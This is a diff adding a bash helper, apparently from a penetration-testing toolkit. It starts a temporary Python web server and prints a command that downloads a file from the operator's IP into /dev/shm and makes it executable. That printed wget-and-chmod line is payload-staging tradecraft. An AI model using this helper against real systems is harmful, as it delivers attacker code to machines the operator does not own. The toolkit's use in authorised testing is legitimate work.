@@ -1,0 +1,36 @@
+#!/bin/bash
+
+. "${repository_root}/yaes/modules/common-utils"
+
+function http_server
+{
+    # load config for repository root
+    source ${config_path}
+    netstat -tulpen | egrep -q ":${web_port}[ ]+"
+    if [[ ${?} -eq 0 ]]
+    then
+      decho_red "found other process listening on port ${web_port}, terminating..."
+      exit 1
+    fi
+    decho_green "starting http server..."
+    current_dir=$( pwd )
+    client=${1}
+    file=${2}
+    if [[ -z ${client} ]]
+    then
+      client="wget"
+    fi
+    #cd ${repository_root}/
+    local_ip=$( ip -f inet -o addr show ${iface} | cut -d\  -f 7 | cut -d/ -f 1 )
+    python -m SimpleHTTPServer ${web_port} &> /dev/null  &
+    if [[ "${client}" == "wget" ]]
+    then
+      decho "wget http://${local_ip}/${file} -O /dev/shm/${file} && chmod +x /dev/shm/${file}"
+    fi
+    sleep 2
+    decho "closing in 60 seconds..."
+    sleep 60
+    cd ${current_dir}
+    ps aux | grep SimpleHTTPServer | grep -v grep | awk ' { print $2 } ' | xargs kill &>/dev/null
+    exit 0
+}
